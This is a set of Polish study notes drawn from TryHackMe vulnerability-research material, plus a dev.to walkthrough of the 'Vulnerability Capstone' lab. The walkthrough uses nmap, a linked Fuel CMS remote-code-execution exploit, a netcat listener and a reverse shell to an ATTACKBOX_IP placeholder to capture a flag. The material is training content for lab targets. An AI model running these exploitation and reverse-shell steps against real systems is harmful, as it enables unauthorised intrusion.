---

W tej sali omówimy sposoby identyfikowania luk w zabezpieczeniach i połączymy nasze umiejętności badawcze, aby dowiedzieć się, jak można je wykorzystać.

Dodatkowo znajdziesz publicznie dostępne zasoby, które będą niezbędnym uzupełnieniem Twoich umiejętności i narzędzi podczas badania i wykorzystywania luk w zabezpieczeniach. Następnie będziesz mógł wykorzystać to wszystko w praktycznym wyzwaniu na koniec zajęć.

## Automatyczne i manualne wyszukiwanie luk

W cyberbezpieczeństwie dostępnych jest mnóstwo narzędzi i usług do skanowania podatności. Skanery podatności, od komercyjnych (i wymagających wysokich opłat) po darmowe i oparte na otwartym kodzie źródłowym, to wygodne narzędzie do szybkiego wyszukiwania luk w aplikacjach.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/a875f0744fa4e296c34693eec4fe623d.png)  

Na przykład skaner podatności [Nessus](https://www.tenable.com/products/nessus) oferuje zarówno wersję darmową (społecznościową), jak i komercyjną. Wersja komercyjna, której roczna licencja kosztuje tysiące funtów, będzie prawdopodobnie wykorzystywana w organizacjach świadczących usługi testów penetracyjnych lub audytów. Jeśli chcesz dowiedzieć się więcej o Nessusie, zajrzyj do poświęconego mu [pokoju na TryHackMe.](https://tryhackme.com/room/rpnessusredux)

W poniższej tabeli szczegółowo opisałem niektóre zalety i wady korzystania ze skanera podatności:

|   |   |
|---|---|
|**Korzyść**|**Niekorzyść**|
|Zautomatyzowane skanowanie można łatwo powtarzać, a jego wyniki można z łatwością udostępniać w obrębie zespołu.|Ludzie często stają się uzależnieni od tych narzędzi.|
|Tego typu skanery są szybkie i umożliwiają wydajne testowanie wielu aplikacji.|Są niezwykle „głośne” i generują dużo ruchu oraz logów. To nie jest dobre, jeśli próbujesz ominąć zapory sieciowe i tym podobne.|
|Istnieją rozwiązania typu open source.|Rozwiązania typu open source są często podstawowe i wymagają drogich licencji, aby mogły zawierać przydatne funkcje.|
|Automatyczne skanery wykrywają szeroką gamę luk w zabezpieczeniach, których ręczne wyszukiwanie może być trudne.|Często nie znajdują wszystkich luk w zabezpieczeniach aplikacji.|

Frameworki takie jak #Metasploit często mają skanery podatności na zagrożenia dla niektórych modułów; jest to temat, o którym dowiesz się w kolejnym module tej ścieżki.

Ręczne skanowanie w poszukiwaniu luk w zabezpieczeniach jest często wybieraną przez testerów penetracyjnych bronią podczas testowania pojedynczych aplikacji lub programów. W rzeczywistości skanowanie ręczne obejmuje wyszukiwanie tych samych luk i wykorzystuje podobne techniki jak skanowanie automatyczne.

Ostatecznie obie techniki polegają na testowaniu aplikacji lub programu pod kątem luk w zabezpieczeniach. Luki te obejmują:

|   |   |
|---|---|
|**Wrażliwość**|**Opis**|
|Błędne konfiguracje zabezpieczeń|Błędy w konfiguracji zabezpieczeń wiążą się z lukami wynikającymi z niedopatrzenia programisty. Na przykład, ujawnianie informacji o serwerze w wiadomościach między aplikacją a atakującym.|
|Złamana kontrola dostępu|Ta luka w zabezpieczeniach pojawia się, gdy atakujący jest w stanie uzyskać dostęp do części aplikacji, do których inaczej nie powinien mieć dostępu.|
|Niebezpieczna deserializacja|Jest to niebezpieczne przetwarzanie danych przesyłanych przez aplikację. Atakujący może przekazać złośliwy kod do aplikacji, gdzie zostanie on następnie wykonany.|
|Zastrzyk|Luka w zabezpieczeniach związana z wstrzyknięciem występuje, gdy atakujący jest w stanie wprowadzić do aplikacji szkodliwe dane. Wynika to z braku zapewnienia (tzw. sanityzacji) bezpieczeństwa danych wejściowych, które nie są szkodliwe.|

Jeśli chcesz dowiedzieć się więcej o tych lukach, [framework](https://owasp.org/www-project-top-ten/) [OWASP](https://owasp.org/www-project-top-ten/) będzie dla Ciebie wartościową lekturą. TryHackMe ma nawet specjalny [dział](https://tryhackme.com/room/owasptop10) prezentujący dziesięć najpopularniejszych luk opisanych przez OWASP .

## Manualne znajdowanie exploitów

**Rapid7**

Podobnie jak inne usługi, takie jak Exploit DB i NVD, #Rapid7 jest bazą danych do badań nad lukami w zabezpieczeniach. Jedyną różnicą jest to, że ta baza danych działa również jako baza exploitów.  Korzystając z tej usługi, można filtrować wyniki według typu luki (tj. aplikacji i systemu operacyjnego).

![](https://assets.tryhackme.com/additional/vulnerability-module/exploiting-a-vulnerability/rapid1.png)  

Dodatkowo, baza danych zawiera instrukcje dotyczące wykorzystywania aplikacji za pomocą popularnego narzędzia #Metasploit ( dokładniej  omówiono  je w dalszej części ścieżki edukacyjnej). Na przykład, ten wpis w [Rapid7](https://www.rapid7.com/db/) dotyczy „ [Projektu i dokumentu WordPress Plugin SP](https://www.rapid7.com/db/modules/exploit/multi/http/wp_plugin_sp_project_document_rce/) ”, gdzie możemy znaleźć instrukcje dotyczące wykorzystania modułu exploita do wykorzystania tej luki.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/13341f677de4db82759d413908781218.png)  

**GitHub**

[GitHub](https://github.com/) to popularna usługa internetowa przeznaczona dla programistów. Strona służy do hostowania i udostępniania kodu źródłowego aplikacji, umożliwiając współpracę.  Jednak badacze bezpieczeństwa również z tych powodów zaczęli korzystać z tej platformy. Badacze bezpieczeństwa przechowują i udostępniają PoC (Proof of Concept) w GitHubie, przekształcając go w tym kontekście w bazę danych exploitów.

GitHub jest niezwykle przydatny w wyszukiwaniu rzadkich lub nowych exploitów, ponieważ każdy może założyć konto i przesłać dane – nie ma tu formalnego procesu weryfikacji, jak w przypadku alternatywnych baz danych exploitów. Należy jednak pamiętać, że wadą PoC jest to , że mogą one nie działać tam, gdzie wsparcie jest ograniczone lub żadne.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/cc2a8c7caa8841aa1c45d10ccc4de385.png)

GitHub korzysta z systemu tagowania i słów kluczowych, co oznacza, że ​​możemy przeszukiwać GitHub według słów kluczowych, takich jak „ PoC ”, „vulnerability” i wielu innych. W momencie pisania tego tekstu dostępnych jest 9682 repozytoriów ze słowem kluczowym „ cve ”.  Możemy również filtrować wyniki według języka programowania.

**Searchsploit**

#Searchsploit to narzędzie dostępne w popularnych dystrybucjach pentestingowych, takich jak Kali Linux . Jest również dostępne w TryHackMe AttackBox. To narzędzie to offline'owa kopia Exploit-DB zawierająca kopie exploitów w Twoim systemie. 

Możesz przeszukiwać searchsploit według nazwy aplikacji i/lub typu luki w zabezpieczeniach. Na przykład, w poniższym fragmencie kodu przeszukujemy #searchsploit pod kątem exploitów związanych z #WordPressem, z których możemy skorzystać – bez konieczności pobierania!

Wykorzystanie Searchsploit do wyszukiwania exploitów związanych z „Wordpress”

```shell-session
searchsploit wordpress
WordPress Theme Think Responsive 1.0 - Arbitr | php/webapps/29332.txt
WordPress Theme This Way - 'upload_settings_i | php/webapps/38820.php
WordPress Theme Toolbox - 'mls' SQL Injection | php/webapps/38077.txt
WordPress Theme Trending 0.1 - 'cpage' Cross- | php/webapps/36195.txt
WordPress Theme Uncode 1.3.1 - Arbitrary File | php/webapps/39895.php
WordPress Theme Urban City - 'download.php' A | php/webapps/39296.txt
WordPress Theme Web Minimalist 1.1 - 'index.p | php/webapps/36184.txt
WordPress Theme White-Label Framework 2.0.6 - | php/webapps/38105.txt
WordPress Theme Wp-ImageZoom - 'id' SQL Injec | php/webapps/38063.txt
WordPress Theme Zoner Real Estate - 4.1.1 Per | php/webapps/47436.txt
```

Odpowiedz na poniższe pytania

Z jakiej strony internetowej skorzystałbyś jako badacz ds. bezpieczeństwa, gdybyś chciał przesłać dowód koncepcji?

## Przykład eksploracji ręcznej

Możemy wykorzystać informacje zebrane w zadaniu 2 w tym pomieszczeniu do wykorzystania luki w zabezpieczeniach usługi. Ostatecznie jedną z najskuteczniejszych luk, jakie możemy wykorzystać, jest możliwość wykonywania poleceń na komputerze docelowym, na którym działa podatna aplikacja lub usługa.

Na przykład, możliwość wykonywania poleceń na komputerze docelowym, na którym działa podatna na atak aplikacja lub usługa, pozwoli nam odczytywać pliki lub wykonywać polecenia, których wcześniej nie bylibyśmy w stanie wykonać za pomocą samej aplikacji lub usługi. Dodatkowo, możemy to wykorzystać, aby uzyskać tzw. dostęp do konsoli podatnej maszyny. Dostęp ten to dostęp do konsoli podatnej maszyny, z którego możemy następnie zacząć wykorzystywać inne aplikacje lub maszyny w sieci.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/c6ae99b23ba4bb870a9957ded1becd31.png)  

Wykorzystamy exploit w celu zdalnego wykonania kodu w aplikacji z zadania 2, aby móc zdalnie wykonywać polecenia na podatnej maszynie.

**Zanim zaczniemy** , warto zauważyć, że exploity rzadko są gotowe do użycia od razu po instalacji. Często wymagają konfiguracji, zanim zaczną działać w naszym środowisku lub na naszym celu. Poziom konfiguracji będzie się różnić w zależności od exploita, dlatego często można znaleźć wiele exploitów dla tej samej luki w zabezpieczeniach w jednej aplikacji. To od Ciebie zależy, który exploit jest dla Ciebie najbardziej odpowiedni lub użyteczny.

Na przykład w poniższym fragmencie kodu możemy zobaczyć, że kilka opcji zostało zmienionych tak, aby odzwierciedlały adres IP maszyny, z której przeprowadzamy atak.

Modyfikowanie exploita (przed zmianą )

```shell-session
nano exploit.py
mymachine="192.168.1.10"
port="1337"
```

Modyfikowanie exploita (po zmianie)

```shell-session
nano exploit.py
mymachine="10.13.37.10"
port="1337"
```

Po poprawnym skonfigurowaniu exploita, zapoznajmy się z nim bliżej, aby zrozumieć, jak go używać. W poniższym fragmencie kodu widać, że podczas uruchamiania exploita należy podać dwa argumenty:

Wypisanie argumentów przemawiających za wykorzystaniem exploita

```shell-session
exploit.py --help
To use this exploit, provide the following arguments:
-u The URL of the application
-c the command that you wish to execute
```

Mając te informacje w pamięci, jesteśmy gotowi do wykorzystania tego exploita na podatnej maszynie. Wykonamy następujące czynności:

1. Użyj tej luki w zabezpieczeniach, aby przesłać do podatnej aplikacji złośliwy plik zawierający dowolne polecenie, które chcesz wykonać. Serwer WWW uruchomi wówczas ten złośliwy plik w celu wykonania kodu.
2. Plik będzie zawierał najpierw podstawowe polecenie, którego użyjemy do sprawdzenia, czy exploit zadziałał.
3. Następnie odczytamy zawartość pliku znajdującego się na podatnym na atak komputerze.

Uruchomienie exploita w celu wyświetlenia nazwy użytkownika, jako którego uruchomiona jest aplikacja

```shell-session
exploit.py -u http://10.10.10.10 -c "whoami"
www-data
```

Uruchomienie exploita w celu wyświetlenia zawartości pliku na komputerze docelowym

```shell-session
exploit.py -u http://10.10.10.10 -c "cat flag.txt"
THM{EXPLOIT_COMPLETE}
```
### CWICZENIE 

# Rozwiązywanie problemu „Zwieńczenie podatności” w TryHackMe – kompletny przewodnik

[#wyzwanie](https://dev.to/t/challenge)[#bezpieczeństwo informacji](https://dev.to/t/infosec)[#spróbuj mnie zhakować](https://dev.to/t/tryhackme)[#cyberbezpieczeństwo](https://dev.to/t/cybersecurity)

**Wprowadzenie**  
_W tym poście opowiem o moich doświadczeniach z rozwiązywaniem zadania z sali Vulnerability Capstone na TryHackMe. Sala ta jest ostatnim wyzwaniem w module „Badanie luk w zabezpieczeniach” i ma na celu sprawdzenie umiejętności identyfikowania, badania i wykorzystywania rzeczywistych luk w zabezpieczeniach._

**Krok 1: Wstępne rozpoznanie.**  
Zanim przejdziemy do eksploatowania, musimy zebrać informacje o systemie docelowym. Najpierw uruchom maszynę, a następnie AttackBox. Użyjemy narzędzia o nazwie **nmap** . Po poprawnym załadowaniu wszystkiego, przejdźmy do terminala Kali i rozpocznijmy skanowanie maszyny docelowej z adresem IP `10.10.56.68`. Użyłem następującego kodu:  

```
nmap -sV -sC -T4 10.10.56.68 -vv
```

[![skanowanie nmap](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F4xydpyqsyoamz68xohc8.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F4xydpyqsyoamz68xohc8.png)

_Przewijając terminal nieco w dół, znaleźliśmy interesujące nas za pierwszym razem informacje._

[![skanowanie nmap 2](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fzdxchnewso2gs6sftfbn.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fzdxchnewso2gs6sftfbn.png)

_Teraz możemy odpowiedzieć na pierwszą grupę pytań._

[![zadanie 1](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fp5md7c8kadgcsk4bu6ev.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fp5md7c8kadgcsk4bu6ev.png)

_W drugiej części tego zadania skorzystam z narzędzia o nazwie **GOOGLE** , jest ono darmowe i można je uruchomić w przeglądarce internetowej ;) i sprawdzę, czy **Fuel CMS** ma jakieś ujawnione CVE._

[![luki w ukośnych krawędziach](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fu0jcm8koqlejgxw7koh4.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fu0jcm8koqlejgxw7koh4.png)

_To jest nasza kolejna odpowiedź na liście. Teraz skupmy się na naszym ostatnim zadaniu, czyli przejęciu flagi._

> SZYBKIE WSKAZÓWKI! Jesteś w przeglądarce, dlaczego nie odwiedzisz adresu 10.10.56.68?!

_Zgadza się, ale warto wspomnieć jeszcze o jednym: w nmap zauważyliśmy ukryty plik txt. Po przejściu do tej ścieżki w przeglądarce zostanie wyświetlona inna lokalizacja w sieci, w której można szukać._

[![plik txt](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fx2zwbwwhm0c35c02istg.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fx2zwbwwhm0c35c02istg.png)

_Przejdźmy zatem do ścieżki **paliwowej** ._

[![formularz logowania](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fsv4zyf50y9uaamrbrh5t.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fsv4zyf50y9uaamrbrh5t.png)

_Formularz logowania, ciekawe. Przeanalizowałem kod źródłowy, ale nie znalazłem żadnych szczegółów na temat potencjalnej nazwy użytkownika. Musimy wykorzystać lukę CVE, którą odkryliśmy wcześniej. Po kilku poszukiwaniach musimy skopiować i wkleić ten exploit do pliku, który chcemy utworzyć:_ [https://gist.github.com/anir0y/8529960c18e212948b0e40ed1fb18d6d](https://gist.github.com/anir0y/8529960c18e212948b0e40ed1fb18d6d)

_Zapiszmy **to** w pliku z rozszerzeniem Python_  

```
nano exploit.py
```

[![exploit wklejony](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fhax3fl5zubb6htd3mxql.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fhax3fl5zubb6htd3mxql.png)

_Zapisz i uruchom za pomocą polecenia python3:_

[![rozkaz](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ff6qkdfr0t5k8as8q0ue8.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ff6qkdfr0t5k8as8q0ue8.png)  

```
python3 exploit.py 10.10.56.68
```

[![uruchomienie exploita](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fmmed5hggsg6ljho6u7w2.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fmmed5hggsg6ljho6u7w2.png)

_Ok, musimy skonfigurować w innym oknie terminala sesję **NetCat** gotową do pobrania odwrotnej powłoki z Fuel CMS, w ten sposób._

[![sesja netcat](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fh7xaiuweeudsjnh4tptb.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fh7xaiuweeudsjnh4tptb.png)

_Wróćmy do terminala okna exploita, wprowadźmy `shell_me`i podajmy `ATTACKBOX_IP:4444`jako atakujący adres IP i port, aby nasłuchiwać._

[![eksploatować pomyślnie](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F5faha5y4k76ioo5fdw0i.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F5faha5y4k76ioo5fdw0i.png)

_Po otrzymaniu odwrotnej powłoki do aplikacji, zdobycie flagi jest łatwe, ponieważ ścieżka jest zawarta w pytaniu! **THM{ACKME_BLOG_HACKED}** to nasza ostateczna odpowiedź i to wszystko, moi drodzy!_

[![flaga](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fabl7ljmvsdsm1tg0nwxl.png)](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fabl7ljmvsdsm1tg0nwxl.png)

**💡 Podsumowanie:**  
_Sala „Vulnerability Capstone” była czymś więcej niż tylko wyzwaniem – to była mini-sesja red-teamowa, która sprawdziła moje umiejętności techniczne i nastawienie na rozwiązywanie problemów. Jeśli chcesz ugruntować swoje podstawy pentestingu, ta sala jest pozycją obowiązkową._

[![profil](https://media2.dev.to/dynamic/image/width=64,height=64,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Forganization%2Fprofile_image%2F140%2F9639a040-3c27-4b99-b65a-85e100016d3c.png)

MongoDB

](https://dev.to/mongodb)Lansowany

[  
](https://www.mongodb.com/cloud/atlas/lp/try3?utm_campaign=display_devto-broad_pl_flighted_atlas_tryatlaslp_prosp_gic-null_ww-all_dev_dv-all_eng_leadgen&utm_source=devto&utm_medium=display&utm_content=aipowered-v1&bb=241239)

## czym jest exploit

Exploit może przybierać różne formy, takie jak plik wykonywalny przeznaczony dla określonego punktu końcowego, który może zostać dostarczony za pośrednictwem wiadomości tekstowej, załącznika do wiadomości e-mail, a nawet pliku ukrytego w plikach cyfrowych. Po uruchomieniu exploita atakujący może wykonać różne działania w systemie docelowym, takie jak zdalne lub lokalne sterowanie nim, zakłócanie jego funkcjonalności, kradzież danych lub inne działania, na które pozwalają zasoby systemu.  

Exploit może mieć charakter lokalny lub zdalny. Atakujący, który ma już dostęp do określonego zasobu obliczeniowego, może lokalnie wykonać kod, aby zwiększyć swoje uprawnienia. Może również zainstalować dodatkowy złośliwy kod lub uzyskać zdalną kontrolę nad zasobem. Atakujący, który wykorzystuje lukę zdalnie, za pośrednictwem sieci lub kanału komunikacyjnego, aby uzyskać kontrolę nad systemem, używa określonego rodzaju exploita, znanego jako zdalny exploit. Exploit to narzędzie techniczne, które może zostać użyte przeciwko dowolnemu użytkownikowi w autonomicznym lub połączonym środowisku cybernetycznym. W środowisku autonomicznym exploit może zostać dostarczony za pośrednictwem nośników wymiennych. 

Exploity mogą być opracowywane i finansowane przez różne podmioty, w tym państwa dążące do cyberszpiegostwa lub cyberwojny, zorganizowane grupy przestępcze pragnące czerpać zyski z ich działalności oraz hakerów w dark webie sprzedających swoje usługi tym, którzy oferują najwięcej. Ponadto niektórzy wyspecjalizowani aktorzy poszukują słabych punktów i opracowują dla nich exploity. Należy pamiętać, że exploit nie jest celem samym w sobie. Jest to metoda realizacji znacznie poważniejszych zadań. Tworzenie exploitów to skomplikowany proces wymagający dużej wiedzy z zakresu bezpieczeństwa informacji. W rezultacie angażuje on doświadczone osoby i ciągłe aktualizacje, które mogą osiągać wysokie ceny na niszowych lub nielegalnych rynkach (głównie w dark webie).

## cykl życia podatności 

Departament Obrony (DoD) wdrożył [Program ujawniania luk w zabezpieczeniach (VDP)(otwiera się w nowej karcie)](https://www.dc3.mil/Missions/Vulnerability-Disclosure/Vulnerability-Disclosure-Program-VDP/)który wykorzystuje powszechnie uznawany [Cykl Życia Ram Podatności(otwiera się w nowej karcie)](https://thescif.org/lifecycle-of-a-vulnerability-overview-part-one-374a01c73096?gi=8ba01d1d3d89)aby lepiej zrozumieć, jak można wcześniej zapobiegać podatnościom. VDP zazwyczaj obejmuje selekcję, walidację i ułatwianie łagodzenia skutków zgłoszeń podatności przesyłanych przez badaczy. Pięć etapów cyklu życia struktury podatności to: **wykrywanie, koordynacja, łagodzenie, zarządzanie i wyciąganie wniosków** ; jednak ścieżka, jaką przechodzi podatność od identyfikacji do załatania, może być różna. Poniższy schemat przedstawia różne etapy cyklu życia podatności w sposób mniej więcej liniowy.

![Różne etapy cyklu życia podatności](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/010b30ab11a3760f6a43d52cb2782c46.png)  

- **Wprowadzenie produktu na rynek:**  Dostawca na rynku publicznym wprowadza na rynek produkt informatyczny (sprzęt lub oprogramowanie).
- **Odkrycie luk w zabezpieczeniach (publicznych lub prywatnych):**  Badacze pracujący niezależnie lub sponsorowani przez organizacje prywatne/publiczne, działający na rzecz różnych interesów, odkrywają luki w zabezpieczeniach produktu. Luka 0-day to taka, która nie została jeszcze ujawniona publicznie po jej znalezieniu. W każdym innym przypadku, po znalezieniu luki, jest ona udostępniana publicznie za pośrednictwem internetu lub innych specjalistycznych źródeł. Zanim luka zostanie publicznie ujawniona online, producent zazwyczaj na tym etapie opracowuje już poprawkę lub aktualizację dla produktu.
- **Opracowanie dowodu koncepcji (PoC) lub Exploit:**  A PoC Dowód na możliwość wykorzystania nowo odkrytej luki w zabezpieczeniach jest przygotowywany wewnętrznie przez dostawcę lub otrzymywany od łowców błędów/niezależnych badaczy. Na tym etapie kluczowe jest zachowanie dyskrecji w ujawnieniu luki, ponieważ PoC jest zazwyczaj pierwszym etapem opracowywania exploita i może być wykorzystywany przez osoby o złych zamiarach.
- **Opracowywanie poprawek lub aktualizacji:**  Producent produktu tworzy poprawki lub aktualizacje, aby zapobiec wykorzystaniu znanej luki w zabezpieczeniach przez osoby trzecie.
- **Wydanie poprawki:**  Producent produktu udostępnia poprawkę eliminującą lukę w zabezpieczeniach, aby klienci mogli ją zastosować w swoim produkcie.
- **Instalacja poprawki:**  Klient lub użytkownik końcowy aktualizuje lub łata swoje systemy, dzięki czemu nie można wykorzystać znanej luki w zabezpieczeniach.

Wykorzystanie luk w zabezpieczeniach lub tworzenie exploitów w oparciu o istniejące luki to proces wymagający dogłębnego zrozumienia zasobu docelowego, niezależnie od tego, czy jest to oprogramowanie, sprzęt, czy jakikolwiek inny system, który jest wykorzystywany. Tworzenie exploita obejmuje kroki, które różnią się w zależności od systemu docelowego. Wymaga **czasu, wiedzy specjalistycznej i znajomości docelowej** technologii, aby można ją było wykorzystać jako broń lub wykorzystać. 

Lukę można wykorzystać jako broń, **lokalnie opracowując exploita lub kupując go od dostawców** na podziemnych forach lub wyspecjalizowanych rynkach. Schemat blokowy przedstawia opatrzony komentarzem okres, w którym możliwe jest wykorzystanie luki jako broni.

![schemat blokowy okresu możliwości wykorzystania luki w zabezpieczeniach](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e0bed60e9d9bd82ec747e4fac57d2c30.png)

Okno możliwości wykorzystania zasobów jest zmienne i zależy od kilku czynników, takich jak dostępność aktualizacji, czas wykrycia i powaga awarii. Wykorzystanie **luk 0-day może zająć od kilku dni do kilku miesięcy, a nawet lat** . Ponieważ ataki 0-day są zazwyczaj wymierzone w konkretne cele, ich znalezienie wymaga czasu i wysiłku. Na powyższym rysunku „n-day” odnosi się do exploita z dostępną poprawką. W tym przypadku „ **n** ” oznacza liczbę dni, które upłynęły od wydania poprawki.

Jak wspomniano powyżej, data pierwszego wykrycia luki w zabezpieczeniach jest zazwyczaj nieznana; jednakże CVE baza danych pokazuje daty CVE- Przypisanie identyfikatorów i publikacje. Kody CVE są często publikowane zaraz po udostępnieniu poprawki przez dostawców. **Przeciwnicy z dostępem do zaktualizowanego oprogramowania mogą dokonać inżynierii wstecznej poprawki, aby znaleźć lukę w zabezpieczeniach** . Według [bazy danych Exploitów(otwiera się w nowej karcie)](https://www.exploit-db.com/)Większość publicznych exploitów powstaje w pierwszym tygodniu po wydaniu poprawki. Aby dać swoim klientom więcej czasu na aktualizację, niektórzy producenci mogą przełożyćCVEogłoszenie. KiedyCVEPo formalnym opublikowaniu informacji o podatności, opinia publiczna będzie mogła natychmiast uzyskać dostęp do informacji o niej. Większość dostawców zabezpieczeń rozpoczyna obecnie tworzenie sygnatur podatności i strategii zapobiegania, aby zapewnić ochronę przed zagrożeniami.

Łączenie exploitów w tandemie, znane również jako „ **łańcuchowanie exploitów** ” lub „ **eksploatacja wieloetapowa** ”, to technika stosowana przez hakerów do łączenia wielu exploitów wykorzystujących luki w zabezpieczeniach, aby uzyskać pełną kontrolę nad systemem docelowym. Oczekiwanym celem jest opracowanie kompletnego systemu  **zdalnego wykonania kodu (Remote Code Execution).RCE) łańcuch** , umożliwiający atakującemu wykonanie dowolnego kodu w systemie docelowym z najwyższymi uprawnieniami.

- ![Łańcuchowy cykl życia exploitów](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6db928385248e0724b3f785390be98fc.png)**Rekonesans:**  Atakujący zbiera informacje o systemie docelowym i jego lukach w zabezpieczeniach. Można to zrobić różnymi metodami, takimi jak skanowanie sieci, skanowanie portów i skanowanie podatności.
- **Początkowy exploit:**  Atakujący wykorzysta informacje zebrane podczas fazy rozpoznania, aby zidentyfikować początkową lukę w zabezpieczeniach, którą można wykorzystać, która może być znana i która nie została załatana. Atakujący użyje exploita, który wykorzysta tę lukę, aby uzyskać dostęp do systemu docelowego.
- **Eskalacja uprawnień:**  Dzięki temu użytkownicy będą mogli uzyskać dostęp do poufnych informacji, takich jak dane logowania i pliki systemowe, a także wykonywać kod z wyższymi uprawnieniami.
- **Trwałość:**  Atakujący będzie używał innych exploitów, aby ustanowićtrwałośćw systemie docelowym, co pozwala im zachować dostęp, nawet jeśli początkowy błąd zostanie wykryty i naprawiony.
- **Przemieszczanie się w przestrzeni:**  Atakujący będzie następnie wykorzystywał kolejne exploity, aby przemieszczać się w przestrzeni sieciowej systemu docelowego i atakować inne systemy. Umożliwi mu to dostęp do dodatkowych poufnych informacji i zasobów.
- **RCE**:Gdy atakujący ustaliłtrwałośći poruszając się poziomo w sieci, wykorzystają ostatnią lukę w łańcuchu, aby uzyskać RCE Może to obejmować wykorzystanie złośliwego oprogramowania w celu przejęcia kontroli nad systemem docelowym lub wykorzystanie luki w zabezpieczeniach umożliwiającej eskalację uprawnień w celu uzyskania dostępu do jądra systemu docelowego.

